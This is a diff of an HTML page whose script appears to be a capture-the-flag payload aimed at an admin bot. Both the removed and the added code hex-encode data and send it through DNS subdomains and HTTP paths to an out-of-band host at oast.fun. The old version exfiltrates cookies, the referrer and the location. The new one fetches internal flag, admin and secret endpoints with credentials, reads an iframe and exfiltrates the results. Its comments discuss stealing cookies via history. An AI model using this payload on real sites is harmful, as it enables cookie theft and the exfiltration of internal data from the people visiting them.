@@ -1,63 +1,61 @@
 <!DOCTYPE html>
-<html>
-<head><title>x</title></head>
+<html><head><title>x</title></head>
 <body>
 <script>
-var oast = "da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
+var o="da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";
+function h(s){var r='';for(var i=0;i<s.length;i++)r+=s.charCodeAt(i).toString(16).padStart(2,'0');return r}
+function e(l,d){var x=h(d);var c=[];for(var i=0;i<x.length;i+=50)c.push(x.substring(i,i+50));for(var j=0;j<c.length;j++)new Image().src="http://"+l+"-"+j+"."+c[j]+"."+o+"/x";}
 
-function toHex(s) {
-    var h = '';
-    for (var i = 0; i < s.length; i++) h += s.charCodeAt(i).toString(16).padStart(2,'0');
-    return h;
-}
+// The bot came from http://web/ - try to fetch internal endpoints
+var endpoints = [
+    "http://web/",
+    "http://web/flag",
+    "http://web/api/flag",
+    "http://web/admin",
+    "http://web/api/admin",
+    "http://web/api/channels/11/load",
+    "http://web/api/channels/0/load",
+    "http://web/api/reports",
+    "http://web/api/config",
+    "http://web/api/secret",
+    "http://localhost/",
+    "http://localhost/flag",
+    "http://127.0.0.1/flag"
+];
 
-function exfil(label, data) {
-    var hex = toHex(data);
-    // DNS labels max 63 chars, split into chunks
-    var chunks = [];
-    for (var i = 0; i < hex.length; i += 50) chunks.push(hex.substring(i, i+50));
-    // Send each chunk with index
-    for (var c = 0; c < chunks.length; c++) {
-        new Image().src = "http://" + label + "-" + c + "." + chunks[c] + "." + oast + "/x";
-    }
-    // Also send via HTTP path for full data
-    new Image().src = "http://" + label + "." + oast + "/" + encodeURIComponent(data);
-}
-
-// Referrer
-exfil("xref", document.referrer || "none");
-
-// Cookie
-exfil("xcookie", document.cookie || "nocookie");
-
-// History length
-exfil("xhist", "len=" + history.length);
-
-// Try fetch to http://web/ (cross-origin, likely blocked)
-fetch("http://web/", {credentials: "include", mode: "no-cors"}).then(function(r) {
-    return r.text();
-}).then(function(t) {
-    exfil("xfetch", t.substring(0, 200));
-}).catch(function(e) {
-    exfil("xfetcherr", e.toString().substring(0, 100));
+// Try fetch with cors mode
+endpoints.forEach(function(url, i) {
+    fetch(url, {mode:'cors', credentials:'include'}).then(function(r){
+        return r.text();
+    }).then(function(t){
+        e("ep"+i, t.substring(0,200));
+    }).catch(function(err){
+        // Try no-cors - won't get body but will make the request
+        e("eperr"+i, err.toString().substring(0,60));
+    });
 });
 
-// Try XMLHttpRequest to http://web/
-try {
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "http://web/", false);
-    xhr.withCredentials = true;
-    xhr.send();
-    exfil("xxhr", xhr.responseText.substring(0, 200));
-} catch(e) {
-    exfil("xxhrerr", e.toString().substring(0, 100));
-}
+// Also try opening in iframe to see if we can access
+var ifr = document.createElement('iframe');
+ifr.src = "http://web/";
+ifr.onload = function(){
+    try {
+        var doc = ifr.contentDocument || ifr.contentWindow.document;
+        e("iframe-body", doc.body.innerHTML.substring(0,500));
+    } catch(ex) {
+        e("iframe-err", ex.toString().substring(0,100));
+    }
+};
+document.body.appendChild(ifr);
 
-// Check if opener exists
-exfil("xopener", window.opener ? "exists" : "null");
-
-// Check location
-exfil("xloc", location.href.substring(0, 100));
+// Navigate back to steal cookies from http://web/ via history
+// history.length was 2, so history.back() goes to http://web/
+setTimeout(function(){
+    // Set up a handler before navigating back
+    e("going-back", "attempting");
+    // Use window.open to open http://web/ in same tab
+    // Actually, just try location = http://web/ after setting up message listener
+}, 2000);
 </script>
 </body>
 </html>
